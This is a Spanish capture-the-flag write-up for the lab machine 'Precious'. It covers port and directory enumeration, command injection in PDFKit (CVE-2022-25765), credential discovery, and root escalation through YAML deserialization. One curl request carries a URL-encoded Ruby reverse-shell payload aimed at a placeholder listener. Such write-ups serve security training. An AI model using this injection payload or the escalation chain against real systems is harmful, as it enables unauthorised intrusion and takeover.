<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Precious</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Precious</h1><br/><p>Enumeración de puertos</p><p>  <strong> nmap -sV -sC -p- --open 10.10.11.189 -T4 -A -vv -oN scan.txt</strong></p><p></p><p>Encuentro los servicios <strong>ssh</strong> y <strong>http</strong></p><p></p><p>Añado la IP a <strong>/etc/hosts</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong>A simple vista le pasamos una url y la convierte en pdf</p><p>   <img src="images/88-1.png" alt="images/88-1.png" /></p><p></p><p>Hago una enumeración de endpoints con gobuster</p><p>  <strong> gobuster dir -u </strong><strong><a href="http://precious.htb/">http://precious.htb/</a></strong><strong> -w /usr/share/wordlists/dirb/big.txt</strong></p><p></p><p>Intercepto la solicitud con Burpsuite</p><p></p><p>Me devuelve que no puede ser una URL remota por lo que creo un servidor local con httpserver para que me genere el pdf</p><p></p><p>Veo que me crea el pdf</p><p>   <img src="images/88-2.png" alt="images/88-2.png" /></p><p></p><p>Miro si realmente me descargó un archivo pdf con exiftool. Al analizar los metadatos me da algo que considero importante</p><p></p><p>Me da una versión de la herramienta que se usó para crear el pdf</p><p>   <img src="images/88-3.png" alt="images/88-3.png" /></p><p></p><p>Tras buscar la versión encuentro que es vulnerable a CMD Injection <a href="https://www.cve.org/CVERecord?id=CVE-2022-25765">CVE-2022-25765</a></p><p></p><p> El espacio de nombres PdfKit proporciona funciones para leer, escribir y anotar documentos PDF</p><p></p><p>Primero tendremos que arrancar el http.server</p><p>   <img src="images/88-4.png" alt="images/88-4.png" /></p><p></p><p>Luego arrancamos el nc listener</p><p>   <img src="images/88-5.png" alt="images/88-5.png" /></p><p></p><p>Y realizamos la siguiente solicitud con curl</p><p> <strong>  curl &#39;TARGET_ADDRESS&#39; -X POST -H &#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&#39; -H &#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8&#39; -H &#39;Accept-Language: en-US,en;q=0.5&#39; -H &#39;Accept-Encoding: gzip, deflate&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -H &#39;Origin: TARGET_ADDRESS&#39; -H &#39;Connection: keep-alive&#39; -H &#39;Referer: TARGET_ADDRESS&#39; -H &#39;Upgrade-Insecure-Requests: 1&#39; --data-raw &#39;url=http%3A%2F%2FLOCAL-ADDRESS%3ALOCAL-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22LOCAL-ADDRESS%22%2CLOCAL-PORT%29%29%27%60&#39;</strong></p><p></p><p>Obtengo el reverse</p><p>   <img src="images/88-6.png" alt="images/88-6.png" /></p><p></p><p>En home encuentro un usuario lllamado henry por lo que puede que tenga que hacer lateral movement</p><p>   <img src="images/88-7.png" alt="images/88-7.png" /></p><p></p><p>La flag de user está en henry pero no tengo permisos de lectura</p><p>   <img src="images/88-8.png" alt="images/88-8.png" /></p><p></p><p>Puede que en la ruta config encuentre alguna credencial</p><p>   <img src="images/88-9.png" alt="images/88-9.png" /></p><p>   </p><p>No encuentro nada interesante</p><p>   </p><p>Tras buscar en los directorios de ruby encuentro las credenciales de henry</p><p>   <img src="images/88-10.png" alt="images/88-10.png" /></p><p>   </p><p>A través de SSH entro como el user henry y obtengo la flag de user</p><p>   <img src="images/88-11.png" alt="images/88-11.png" /></p><p>   </p><p>Con sudo -l veo que puedo ejecutar una script como root</p><p>   <img src="images/88-12.png" alt="images/88-12.png" /></p><p>   </p><p>Hago un cat al archivo para ver si encuentro algi interesante</p><p>   </p><p>usal YAML por lo que es vulnerable a ataque de deserialización YAML.</p><p>   </p><p>Esta script se usa para administrar paquetes en Ruby</p><p>   </p><p>Esta parte me interesa</p><p>   <img src="images/88-13.png" alt="images/88-13.png" /></p><p>   </p><p>Creo el archivo en <strong>/dev/shm</strong> que será el que ejecute con ruby</p><p>   <img src="images/88-14.png" alt="images/88-14.png" /></p><p>   </p><p>Creo el privesc</p><p>   <img src="images/88-15.png" alt="images/88-15.png" /></p><p>   </p><p>Ahora nos da un error , la salida del id   </p><p> <img src="images/88-16.png" alt="images/88-16.png" /></p><p>   </p><p>Se pierde el id pero encontramos una ejecución como root</p><p>   <img src="images/88-17.png" alt="images/88-17.png" /></p><p>   </p><p>Estoy dentro del grupo root con henry y accedo a root ejecutandolo con -p me dará un <strong>shell</strong> efectivo con el GID y el UID como root</p><p>   <img src="images/88-18.png" alt="images/88-18.png" /></p></div>
</body>
</html>
